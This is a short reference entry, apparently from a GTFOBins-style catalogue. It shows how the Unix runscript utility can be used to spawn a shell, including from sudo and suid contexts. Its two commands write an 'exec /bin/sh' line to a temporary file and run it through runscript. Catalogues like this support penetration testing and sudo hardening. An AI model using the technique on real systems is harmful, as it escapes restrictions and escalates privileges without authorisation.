---
type: gtfobin
name: runscript
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# runscript

## shell

```bash
echo '! exec /bin/sh' >/path/to/temp-file
runscript /path/to/temp-file
```
**Contexts:** sudo, suid, unprivileged
